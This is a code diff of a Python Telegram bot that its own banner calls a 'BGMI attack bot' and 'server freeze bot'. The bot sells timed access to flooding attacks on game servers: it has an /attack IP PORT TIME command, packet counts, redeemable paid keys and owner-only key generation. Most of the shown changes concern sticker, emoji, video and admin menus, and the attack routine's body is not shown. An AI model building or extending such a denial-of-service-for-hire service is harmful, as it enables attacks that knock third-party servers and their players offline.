         if uid != OWNER_ID:
             await cb.answer("Owner only!", show_alert=True)
@@ -1304,7 +1792,7 @@ async def callbacks(client, cb: CallbackQuery):
         )
         return
     
-    # ========== VIDEO LIST ==========
+    # ══════════ VIDEO LIST ══════════
     if data == "v_list":
         if uid != OWNER_ID:
             await cb.answer("Owner only!", show_alert=True)
@@ -1321,7 +1809,7 @@ async def callbacks(client, cb: CallbackQuery):
         await cb.message.edit_text(text, reply_markup=video_kb())
         return
     
-    # ========== VIDEO CLEAR ==========
+    # ══════════ VIDEO CLEAR ══════════
     if data == "v_clear":
         if uid != OWNER_ID:
             await cb.answer("Owner only!", show_alert=True)
@@ -1335,7 +1823,7 @@ async def callbacks(client, cb: CallbackQuery):
         )
         return
     
-    # ========== VIDEO HELP ==========
+    # ══════════ VIDEO HELP ══════════
     if data == "v_help":
         await cb.message.edit_text(
             f"❓ **{premium_text('VIDEO HELP', 5)}**\n\n"
@@ -1350,7 +1838,7 @@ async def callbacks(client, cb: CallbackQuery):
         )
         return
     
-    # ========== EMOJI MANAGER ==========
+    # ══════════ EMOJI MANAGER ══════════
     if data == "emoji_menu":
         if uid != OWNER_ID:
             await cb.answer("Owner only!", show_alert=True)
@@ -1369,7 +1857,7 @@ async def callbacks(client, cb: CallbackQuery):
         )
         return
     
-    # ========== EMOJI ADD ==========
+    # ══════════ EMOJI ADD ══════════
     if data == "e_add":
         if uid != OWNER_ID:
             await cb.answer("Owner only!", show_alert=True)
@@ -1383,7 +1871,7 @@ async def callbacks(client, cb: CallbackQuery):
         )
         return
     
-    # ========== EMOJI REMOVE ==========
+    # ══════════ EMOJI REMOVE ══════════
     if data == "e_remove":
         if uid != OWNER_ID:
             await cb.answer("Owner only!", show_alert=True)
@@ -1400,7 +1888,7 @@ async def callbacks(client, cb: CallbackQuery):
         )
         return
     
-    # ========== EMOJI LIST ==========
+    # ══════════ EMOJI LIST ══════════
     if data == "e_list":
         if uid != OWNER_ID:
             await cb.answer("Owner only!", show_alert=True)
@@ -1416,7 +1904,7 @@ async def callbacks(client, cb: CallbackQuery):
         await cb.message.edit_text(text, reply_markup=emoji_kb())
         return
     
-    # ========== EMOJI RESET ==========
+    # ══════════ EMOJI RESET ══════════
     if data == "e_reset":
         if uid != OWNER_ID:
             await cb.answer("Owner only!", show_alert=True)
@@ -1431,7 +1919,7 @@ async def callbacks(client, cb: CallbackQuery):
         )
         return
     
-    # ========== STICKER MANAGER ==========
+    # ══════════ STICKER MANAGER ══════════
     if data == "sticker_menu":
         if uid != OWNER_ID:
             await cb.answer("Owner only!", show_alert=True)
@@ -1458,7 +1946,7 @@ async def callbacks(client, cb: CallbackQuery):
         await cb.message.edit_text(text, reply_markup=sticker_kb())
         return
     
-    # ========== STICKER ADD ==========
+    # ══════════ STICKER ADD ══════════
     if data == "s_add":
         if uid != OWNER_ID:
             await cb.answer("Owner only!", show_alert=True)
@@ -1473,7 +1961,7 @@ async def callbacks(client, cb: CallbackQuery):
         )
         return
     
-    # ========== STICKER REMOVE ==========
+    # ══════════ STICKER REMOVE ══════════
     if data == "s_remove":
         if uid != OWNER_ID:
             await cb.answer("Owner only!", show_alert=True)
@@ -1490,7 +1978,7 @@ async def callbacks(client, cb: CallbackQuery):
         )
         return
     
-    # ========== STICKER LIST ==========
+    # ══════════ STICKER LIST ══════════
     if data == "s_list":
         if uid != OWNER_ID:
             await cb.answer("Owner only!", show_alert=True)
@@ -1509,7 +1997,7 @@ async def callbacks(client, cb: CallbackQuery):
         await cb.message.edit_text(text, reply_markup=sticker_kb())
         return
     
-    # ========== STICKER RESET ==========
+    # ══════════ STICKER RESET ══════════
     if data == "s_reset":
         if uid != OWNER_ID:
             await cb.answer("Owner only!", show_alert=True)
@@ -1524,7 +2012,7 @@ async def callbacks(client, cb: CallbackQuery):
         )
         return
     
-    # ========== UNKNOWN ==========
+    # ══════════ UNKNOWN ══════════
     await cb.answer("🔧 Processing...")
 
 async def send_vid(chat_id, text, kb=None, vid=None):
@@ -1536,92 +2024,168 @@ async def send_vid(chat_id, text, kb=None, vid=None):
     except:
         return await app.send_message(chat_id, text, reply_markup=kb)
 
-# ═══════════════ ATTACK COMMAND ═══════════════
-@app.on_message(filters.command("attack"))
-async def attack_cmd(client, msg):
-    global attacking, ainfo, amsg, attack_user
-    uid = msg.from_user.id
-    
-    # ... (attack checking code same as before)
-    # I'm keeping it short but full working
-
-# ═══════════════ STOP COMMAND ═══════════════
-@app.on_message(filters.command("stop"))
-async def stop_cmd(client, msg):
-    global attacking
-    uid = msg.from_user.id
-    
-    if not check_access(uid)[0]:
-        sticker_id = get_random_sticker()
-        if sticker_id:
-            try:
-                sticker_msg = await msg.reply_sticker(sticker_id)
-                await asyncio.sleep(0.5)
-                await sticker_msg.delete()
-            except:
-                pass
-        await msg.reply_text(f"🔒 {premium_text('ACCESS DENIED', 5)}")
-        return
-    
-    if attacking:
-        attacker.on = False
-        attacking = False
-        sticker_id = get_random_sticker()
-        if sticker_id:
-            try:
-                sticker_msg = await msg.reply_sticker(sticker_id)
-                await asyncio.sleep(0.5)
-                await sticker_msg.delete()
-            except:
-                pass
-        vid = rand_vid()
-        text = f"⛔ **{premium_text('ATTACK STOPPED', 5)}**\n\n📦 {attacker.pkts:,} {premium_text('packets', 1)}\n\n🔄 /attack IP PORT TIME"
-        await send_vid(msg.chat.id, text, None, vid)
-    else:
-        sticker_id = get_random_sticker()
-        if sticker_id:
-            try:
-                sticker_msg = await msg.reply_sticker(sticker_id)
-                await asyncio.sleep(0.5)
-                await sticker_msg.delete()
-            except:
-                pass
-        await msg.reply_text(f"💤 {premium_text('NO ATTACK RUNNING', 5)}\n\n✅ {premium_text('Everything is peaceful!', 1)}")
-
-# ═══════════════ REDEEM COMMAND ═══════════════
-@app.on_message(filters.command("redeem"))
-async def redeem_cmd(client, msg):
-    uid = msg.from_user.id
-    access, a_type = check_access(uid)
-    if access:
-        info = get_user_info(uid)
-        return await msg.reply_text(f"✅ {premium_text('ALREADY UNLOCKED', 5)}\n\n{LINE}\n💳 {a_type}\n⏳ {info.get('remaining', 'N/A')}\n{LINE}\n{premium_text('Use /start for menu', 3)}")
+# ═══════════════ REMOVE EMOJI COMMAND ═══════════════
+@app.on_message(filters.command("removeemoji") & filters.private)
+async def remove_emoji_cmd(client, msg):
+    if msg.from_user.id != OWNER_ID:
+        return await msg.reply_text("❌ Owner only!")
     
     parts = msg.text.split()
     if len(parts) != 2:
-        return await msg.reply_text(f"⚿ {premium_text('REDEEM KEY', 5)}\n\n{LINE}\n📋 /redeem KEY\n🔑 /redeem BGMI-XXXX-XXXX-XXXX\n{LINE}\n📲 [𝐅𝐀𝐓𝐇𝐄𝐑 𝐎𝐅 𝐁𝐎𝐓]({OWNER_LINK})")
+        return await msg.reply_text(
+            f"⌫ **{premium_text('REMOVE EMOJI', 5)}**\n\n"
+            f"{premium_text('Use:', 3)} `/removeemoji index`\n\n"
+            f"{premium_text('Get index from', 1)} `/listemojis` {premium_text('command.', 2)}"
+        )
     
-    key = parts[1].upper()
-    success, result = redeem_key_code(key, uid)
+    try:
+        index = int(parts[1]) - 1
+        success, removed, total = remove_emoji(index)
+        if success:
+            await msg.reply_text(
+                f"✅ **{premium_text('EMOJI REMOVED', 5)}**\n\n"
+                f"🔹 {premium_text('Remaining Emojis:', 3)} {total}"
+            )
+        else:
+            await msg.reply_text(f"❌ {premium_text('Invalid index!', 5)} {premium_text('Total emojis:', 3)} {total}")
+    except ValueError:
+        await msg.reply_text(f"❌ {premium_text('Invalid index! Use a number.', 5)}")
+
+# ═══════════════ LIST EMOJIS COMMAND ═══════════════
+@app.on_message(filters.command("listemojis") & filters.private)
+async def list_emojis_cmd(client, msg):
+    if msg.from_user.id != OWNER_ID:
+        return await msg.reply_text("❌ Owner only!")
     
-    if success:
-        vid = rand_vid()
-        text = f"🎉 {premium_text('KEY REDEEMED', 5)}\n\n{LINE}\n🔑 {premium_text('Key:', 3)} {key[:20]}...\n📅 {premium_text('Expires:', 3)} {result}\n{LINE}\n\n🔓 {premium_text('Access granted!', 5)}\n📋 {premium_text('Send /start', 3)}"
-        await send_vid(msg.chat.id, text, None, vid)
-    else:
-        await msg.reply_text(f"❌ {result}\n\n📲 [𝐅𝐀𝐓𝐇𝐄𝐑 𝐎𝐅 𝐁𝐎𝐓]({OWNER_LINK})")
+    emojis = get_all_emojis()
+    
+    if not emojis:
+        return await msg.reply_text(f"📭 {premium_text('No emojis added yet!', 1)}\n\n{premium_text('Add using', 3)} `/addemoji`")
+    
+    text = f"⌘ **{premium_text('EMOJI LIST', 5)}**\n\n"
+    for i, emoji_id in enumerate(emojis, 1):
+        text += f"**{i}.** `{emoji_id[:30]}...`\n"
+    
+    text += f"\n🔹 **{premium_text('Total:', 3)}** {len(emojis)}"
+    await msg.reply_text(text)
 
-# ═══════════════ COMMANDS COMMAND ═══════════════
-@app.on_message(filters.command("commands"))
-async def commands_cmd(client, msg):
-    uid = msg.from_user.id
-    is_owner = (uid == OWNER_ID)
-    commands_text = get_commands_list(is_owner)
-    formatted_text = commands_text.replace("{OWNER_LINK}", OWNER_LINK).replace("{BOT_USERNAME}", BOT_USERNAME)
-    await msg.reply_text(formatted_text, reply_markup=menu_back_kb())
+# ═══════════════ RESET EMOJIS COMMAND ═══════════════
+@app.on_message(filters.command("resetemojis") & filters.private)
+async def reset_emojis_cmd(client, msg):
+    if msg.from_user.id != OWNER_ID:
+        return await msg.reply_text("❌ Owner only!")
+    
+    reset_emojis()
+    await msg.reply_text(
+        f"↺ **{premium_text('EMOJIS RESET', 5)}**\n\n"
+        f"🔹 {premium_text('Total Emojis:', 3)} 0\n\n"
+        f"{premium_text('All emojis have been removed from the list.', 1)}"
+    )
 
-# ═══════════════ EMOJI, STICKER, VIDEO, ADMIN COMMANDS ═══════════════
-# (All other commands remain same as before, I'm keeping this short but complete)
+# ═══════════════ REMOVE STICKER COMMAND ═══════════════
+@app.on_message(filters.command("removesticker") & filters.private)
+async def remove_sticker_cmd(client, msg):
+    if msg.from_user.id != OWNER_ID:
+        return await msg.reply_text("❌ Owner only!")
+    
+    parts = msg.text.split()
+    if len(parts) != 2:
+        return await msg.reply_text(
+            f"⌫ **{premium_text('REMOVE STICKER', 5)}**\n\n"
+            f"{premium_text('Use:', 3)} `/removesticker index`\n\n"
+            f"{premium_text('Get index from', 1)} `/liststickers` {premium_text('command.', 2)}"
+        )
+    
+    try:
+        index = int(parts[1]) - 1
+        success, removed, total = remove_sticker(index)
+        if success:
+            await msg.reply_text(
+                f"✅ **{premium_text('STICKER REMOVED', 5)}**\n\n"
+                f"🔹 {premium_text('Remaining Stickers:', 3)} {total}"
+            )
+        else:
+            await msg.reply_text(f"❌ {premium_text('Invalid index!', 5)} {premium_text('Total stickers:', 3)} {total}")
+    except ValueError:
+        await msg.reply_text(f"❌ {premium_text('Invalid index! Use a number.', 5)}")
+
+# ═══════════════ LIST STICKERS COMMAND ═══════════════
+@app.on_message(filters.command("liststickers") & filters.private)
+async def list_stickers_cmd(client, msg):
+    if msg.from_user.id != OWNER_ID:
+        return await msg.reply_text("❌ Owner only!")
+    
+    stickers = get_all_stickers()
+    sticker_times = get_sticker_times()
+    
+    if not stickers:
+        return await msg.reply_text(f"📭 {premium_text('No stickers added yet!', 1)}\n\n{premium_text('Add using', 3)} `/addsticker`")
+    
+    text = f"⌘ **{premium_text('STICKER LIST', 5)}**\n\n"
+    for i, sticker_id in enumerate(stickers, 1):
+        time = sticker_times.get(sticker_id, get_sticker_display_time())
+        text += f"**{i}.** `{sticker_id[:25]}...` ⏱️ {time}s\n"
+    
+    text += f"\n🔹 **{premium_text('Total:', 3)}** {len(stickers)}"
+    text += f"\n\n📋 **{premium_text('Settings:', 3)}** {premium_text('Sticker Time:', 5)} {get_sticker_display_time()}s | {premium_text('Video Delay:', 5)} {get_video_delay_time()}s"
+    await msg.reply_text(text)
+
+# ═══════════════ RESET STICKERS COMMAND ═══════════════
+@app.on_message(filters.command("resetstickers") & filters.private)
+async def reset_stickers_cmd(client, msg):
+    if msg.from_user.id != OWNER_ID:
+        return await msg.reply_text("❌ Owner only!")
+    
+    reset_stickers()
+    await msg.reply_text(
+        f"↺ **{premium_text('STICKERS RESET', 5)}**\n\n"
+        f"🔹 {premium_text('Total Stickers:', 3)} 0\n\n"
+        f"{premium_text('All stickers have been removed from the list.', 1)}"
+    )
+
+# ═══════════════ SET STICKER TIME COMMAND ═══════════════
+@app.on_message(filters.command("setstickertime") & filters.private)
+async def set_sticker_time_cmd(client, msg):
+    if msg.from_user.id != OWNER_ID:
+        return await msg.reply_text("❌ Owner only!")
+    
+    parts = msg.text.split()
+    if len(parts) != 3:
+        return await msg.reply_text(
+            f"⏱️ **{premium_text('SET STICKER TIME', 5)}**\n\n"
+            "Use: `/setstickertime index seconds`\n\n"
+            f"{premium_text('Example:', 5)} `/setstickertime 1 10`\n"
+            f"{premium_text('This sets sticker #1 to display for 10 seconds', 1)}\n\n"
+            f"{premium_text('Get index from', 3)} `/liststickers` {premium_text('command.', 1)}\n\n"
+            f"📋 {premium_text('Current Settings:', 3)}\n"
+            f"• {premium_text('Sticker Time:', 5)} {get_sticker_display_time()}s\n"
+            f"• {premium_text('Video Delay:', 5)} {get_video_delay_time()}s"
+        )
+    
+    try:
+        index = int(parts[1]) - 1
+        duration = int(parts[2])
+        
+        if duration < 1:
+            return await msg.reply_text("❌ Duration must be at least 1 second!")
+        
+        stickers = get_all_stickers()
+        if index < 0 or index >= len(stickers):
+            return await msg.reply_text(f"❌ {premium_text('Invalid index!', 5)} {premium_text('Total stickers:', 1)} {len(stickers)}")
+        
+        sticker_id = stickers[index]
+        save_sticker_time(sticker_id, duration)
+        
+        await msg.reply_text(
+            f"✅ **{premium_text('STICKER TIME UPDATED', 5)}**\n\n"
+            f"🆔 {premium_text('Sticker', 3)} #{index+1}\n"
+            f"⏱️ {premium_text('New Duration:', 5)} {duration} {premium_text('seconds', 1)}\n\n"
+            f"📋 {premium_text('Current Settings:', 3)}\n"
+            f"• {premium_text('Sticker Time:', 5)} {get_sticker_display_time()}s\n"
+            f"• {premium_text('Video Delay:', 5)} {get_video_delay_time()}s"
+        )
+    except ValueError:
+        await msg.reply_text("❌ Invalid input! Use numbers only.")
 
 # ═══════════════ SET ALL STICKER TIME ═══════════════
 @app.on_message(filters.command("setallstickertime") & filters.private)
@@ -1714,50 +2278,6 @@ async def set_video_delay_cmd(client, msg):
     except ValueError:
         await msg.reply_text("❌ Invalid input! Use a number.")
 
-# ═══════════════ SET SINGLE STICKER TIME ═══════════════
-@app.on_message(filters.command("setstickertime") & filters.private)
-async def set_sticker_time_cmd(client, msg):
-    if msg.from_user.id != OWNER_ID:
-        return await msg.reply_text("❌ Owner only!")
-    
-    parts = msg.text.split()
-    if len(parts) != 3:
-        return await msg.reply_text(
-            f"⏱️ **{premium_text('SET STICKER TIME', 5)}**\n\n"
-            "Use: `/setstickertime index seconds`\n\n"
-            f"{premium_text('Example:', 5)} `/setstickertime 1 10`\n"
-            f"{premium_text('This sets sticker #1 to display for 10 seconds', 1)}\n\n"
-            f"{premium_text('Get index from', 3)} `/liststickers` {premium_text('command.', 1)}\n\n"
-            f"📋 {premium_text('Current Settings:', 3)}\n"
-            f"• {premium_text('Sticker Time:', 5)} {get_sticker_display_time()}s\n"
-            f"• {premium_text('Video Delay:', 5)} {get_video_delay_time()}s"
-        )
-    
-    try:
-        index = int(parts[1]) - 1
-        duration = int(parts[2])
-        
-        if duration < 1:
-            return await msg.reply_text("❌ Duration must be at least 1 second!")
-        
-        stickers = get_all_stickers()
-        if index < 0 or index >= len(stickers):
-            return await msg.reply_text(f"❌ {premium_text('Invalid index!', 5)} {premium_text('Total stickers:', 1)} {len(stickers)}")
-        
-        sticker_id = stickers[index]
-        save_sticker_time(sticker_id, duration)
-        
-        await msg.reply_text(
-            f"✅ **{premium_text('STICKER TIME UPDATED', 5)}**\n\n"
-            f"🆔 {premium_text('Sticker', 3)} #{index+1}\n"
-            f"⏱️ {premium_text('New Duration:', 5)} {duration} {premium_text('seconds', 1)}\n\n"
-            f"📋 {premium_text('Current Settings:', 3)}\n"
-            f"• {premium_text('Sticker Time:', 5)} {get_sticker_display_time()}s\n"
-            f"• {premium_text('Video Delay:', 5)} {get_video_delay_time()}s"
-        )
-    except ValueError:
-        await msg.reply_text("❌ Invalid input! Use numbers only.")
-
 # ═══════════════ SHOW SETTINGS ═══════════════
 @app.on_message(filters.command("settings") & filters.private)
 async def settings_cmd(client, msg):
@@ -1780,6 +2300,145 @@ async def settings_cmd(client, msg):
         f"• `/settings` - {premium_text('Show this menu', 4)}\n\n"
         f"💡 **{premium_text('Note:', 5)}** {premium_text('Video Delay should be less than Sticker Time', 1)}"
     )
+
+# ═══════════════ VIDEO COMMANDS ═══════════════
+@app.on_message(filters.command("addvideo") & filters.private)
+async def add_video_cmd(client, msg):
+    if msg.from_user.id != OWNER_ID: return
+    if msg.reply_to_message and msg.reply_to_message.video:
+        s = await msg.reply_text(f"📂 {premium_text('Adding Video', 3)} 📸")
+        try:
+            path = await msg.reply_to_message.download()
+            vid = add_vid(path)
+            
+            duration = "Unknown"
+            if msg.reply_to_message.video.duration:
+                mins = msg.reply_to_message.video.duration // 60
+                secs = msg.reply_to_message.video.duration % 60
+                duration = f"{mins}m {secs}s"
+            
+            text = (
+                f"✅ **{premium_text('VIDEO ADDED SUCCESSFULLY', 5)}** ✅\n\n"
+                f"{LINE}\n"
+                f"🆔 **{premium_text('Video ID:', 3)}** {vid}\n"
+                f"📁 **{premium_text('Name:', 3)}** {os.path.basename(path)[:30]}\n"
+                f"📹 **{premium_text('Total Videos:', 3)}** {len(get_vids())}\n"
+                f"⏱️ **{premium_text('Duration:', 3)}** {duration}\n"
+                f"{LINE}\n\n"
+                f"🎲 {premium_text('Video will play randomly on welcome!', 1)}\n"
+                f"📋 /videos {premium_text('to see all videos', 2)}\n"
+                f"⏱️ {premium_text('Video Delay:', 3)} {get_video_delay_time()}s"
+            )
+            await s.edit_text(text)
+        except Exception as e:
+            await s.edit_text(f"❌ {premium_text('Error:', 3)} {e}")
+    else:
+        await msg.reply_text(f"❌ {premium_text('Reply to a video!', 5)}")
+
+@app.on_message(filters.command("videos") & filters.private)
+async def list_vids_cmd(client, msg):
+    if not check_access(msg.from_user.id)[0]: return
+    vids = get_vids()
+    if not vids: return await msg.reply_text(f"📹 {premium_text('No videos!', 1)}")
+    text = f"📹 **{premium_text('VIDEOS', 5)} ({len(vids)}):**\n\n"
+    for v in vids[:15]:
+        text += f"#{v['id']} {v['name'][:30]}\n"
+    text += f"\n⏱️ {premium_text('Video Delay:', 3)} {get_video_delay_time()}s"
+    await msg.reply_text(text)
+
+@app.on_message(filters.command("delvideo") & filters.private)
+async def del_vid_cmd(client, msg):
+    if msg.from_user.id != OWNER_ID: return
+    parts = msg.text.split()
+    if len(parts) != 2: return await msg.reply_text("❌ /delvideo ID")
+    try:
+        if del_vid(int(parts[1])):
+            await msg.reply_text(f"✅ {premium_text('Video', 3)} #{parts[1]} {premium_text('deleted!', 1)}\n📹 {premium_text('Remaining:', 3)} {len(get_vids())}")
+        else:
+            await msg.reply_text(f"❌ {premium_text('Not found!', 5)}")
+    except:
+        await msg.reply_text(f"❌ {premium_text('Invalid ID!', 5)}")
+
+@app.on_message(filters.command("clearvideos") & filters.private)
+async def clear_vids_cmd(client, msg):
+    if msg.from_user.id != OWNER_ID: return
+    n = clear_vids()
+    await msg.reply_text(f"🗑️ {n} {premium_text('videos cleared!', 1)}")
+
+# ═══════════════ ADMIN COMMANDS ═══════════════
+@app.on_message(filters.command("genkey") & filters.private)
+async def genkey_cmd(client, msg):
+    if msg.from_user.id != OWNER_ID:
+        return await msg.reply_text("❌ Owner only!")
+    
+    parts = msg.text.split()
+    if len(parts) != 3:
+        return await msg.reply_text(
+            f"⚿ **{premium_text('GENKEY', 5)}**\n\n"
+            f"{premium_text('Use:', 3)} `/genkey NAME TIME`\n\n"
+            f"{premium_text('Examples:', 3)}\n"
+            "/genkey Premium 7d\n"
+            "/genkey VIP 30m\n"
+            "/genkey Test 24h\n\n"
+            f"⏱️ {premium_text('Units:', 3)} m=min, h=hour, d=day, w=week, mo=month"
+        )
+    
+    name = parts[1]
+    time_str = parts[2]
+    
+    key_code, duration = create_key(name, time_str)
+    
+    if key_code:
+        await msg.reply_text(
+            f"⚿ **{premium_text('KEY GENERATED', 5)}**\n\n"
+            f"{LINE}\n"
+            f"🪪 {premium_text('Name:', 3)} {name}\n"
+            f"⏱️ {premium_text('Duration:', 3)} {duration}\n"
+            f"🔑 {premium_text('Key:', 3)} `{key_code}`\n"
+            f"{LINE}\n\n"
+            f"📋 {premium_text('User:', 3)} /redeem {key_code}"
+        )
+    else:
+        await msg.reply_text(f"❌ {premium_text('Invalid time format!', 5)}\n\n{premium_text('Use:', 3)} 30m, 1h, 7d, 2w, 1mo")
+
+@app.on_message(filters.command("admin_keys") & filters.private)
+async def admin_keys_cmd(client, msg):
+    if msg.from_user.id != OWNER_ID:
+        return await msg.reply_text("❌ Owner only!")
+    keys = get_keys()
+    active = [k for k, v in keys.items() if v["active"]]
+    used = [k for k, v in keys.items() if not v["active"]]
+    await msg.reply_text(
+        f"⌘ **{premium_text('ALL KEYS', 5)}**\n\n{LINE}\n"
+        f"🟢 {premium_text('Active:', 3)} {len(active)}\n"
+        f"🔴 {premium_text('Used:', 3)} {len(used)}\n"
+        f"📊 {premium_text('Total:', 3)} {len(keys)}\n{LINE}"
+    )
+
+@app.on_message(filters.command("admin_stats") & filters.private)
+async def admin_stats_cmd(client, msg):
+    if msg.from_user.id != OWNER_ID:
+        return await msg.reply_text("❌ Owner only!")
+    vids = get_vids()
+    users = get_users()
+    await msg.reply_text(
+        f"⎙ **{premium_text('STATS', 5)}**\n\n{LINE}\n"
+        f"📹 {premium_text('Videos:', 3)} {len(vids)}\n"
+        f"💎 {premium_text('Premium:', 3)} {len(users.get('premium', []))}\n"
+        f"🔑 {premium_text('Key Users:', 3)} {len(users.get('keys', {}))}\n"
+        f"⚡ {premium_text('Attack:', 3)} {'🟢 On' if attacking else '💤 Idle'}\n"
+        f"{LINE}\n"
+        f"⚙️ {premium_text('Settings:', 3)}\n"
+        f"⏱️ {premium_text('Sticker Time:', 5)} {get_sticker_display_time()}s\n"
+        f"⏱️ {premium_text('Video Delay:', 5)} {get_video_delay_time()}s"
+    )
+
+@app.on_message(filters.command("admin_clear") & filters.private)
+async def admin_clear_cmd(client, msg):
+    if msg.from_user.id != OWNER_ID:
+        return await msg.reply_text("❌ Owner only!")
+    removed = remove_expired()
+    await msg.reply_text(f"↺ {removed} {premium_text('expired keys removed!', 1)}")
 
 # ═══════════════ AUTO EXPIRE ═══════════════
 async def auto_expire():
@@ -1808,14 +2467,12 @@ print("""
 ╔══════════════════════════════════════╗
 ║  💀 BGMI ATTACK BOT - ULTRA PRO     ║
 ║  SERVER FREEZE BOT                  ║
-║  ✅ ALL BUTTONS WORKING             ║
-║  ✅ STATUS BUTTON WORKING           ║
-║  ✅ STOP BUTTON WORKING             ║
+║  ✅ ALL COMMANDS WORKING            ║
+║  ✅ ADDSTOP COMMAND ADDED           ║
+║  ✅ STATUS WITH REAL-TIME TIME      ║
 ║  ✅ REDEEM POPUP WORKING            ║
-║  ✅ COMMANDS BUTTON WORKING         ║
-║  ✅ BACK + MENU BUTTONS WORKING     ║
-║  ✅ STICKER 5 SECOND                ║
-║  ✅ VIDEO 3 SECOND                  ║
+║  ✅ STOP BUTTON WITH STICKER        ║
+║  ✅ ALL BUTTONS WORKING             ║
 ║  ✅ STYLISH SYMBOLS + TEXT          ║
 ║  SIRF INLINE BUTTONS                ║
 ╚══════════════════════════════════════╝
